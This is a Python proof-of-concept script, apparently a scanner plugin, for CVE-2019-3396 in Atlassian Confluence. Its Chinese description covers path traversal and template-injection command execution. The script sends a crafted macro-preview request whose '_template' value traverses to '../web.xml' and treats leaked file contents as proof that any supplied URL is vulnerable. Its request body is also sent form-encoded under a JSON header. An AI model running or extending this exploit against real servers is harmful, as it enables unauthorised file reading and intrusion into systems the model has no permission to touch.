#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import random
import requests
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

def get_plugin_info():
    plugin_info = {
        "name": "Atlassian Confluence 路径穿越与命令执行漏洞（CVE-2019-3396）",
        "desc": "Atlassian Confluence是企业广泛使用的wiki系统，其6.14.2版本前存在一处未授权的目录穿越漏洞，通过该漏洞，攻击者可以读取任意文件，或利用Velocity模板注入执行任意命令。",
        "grade": "高",
        "type": "web",
        "keyword": "tag:confluence cve:CVE-2019-3396"
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        'Referer': arg,
        'Content-Type':'application/json'
        }
    data = {"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"../web.xml"}}}
    try:
        r = requests.post(
            url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/rest/tinymce/1/macro/preview',
            data=data,
            headers=headers,
            timeout=timeout, 
            verify=False
            )
        if r.status_code == 200 and "<param-name>contextConfigLocation</param-name>" in r.text:
            return True
        else:
            return False
    except Exception:
        return 


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

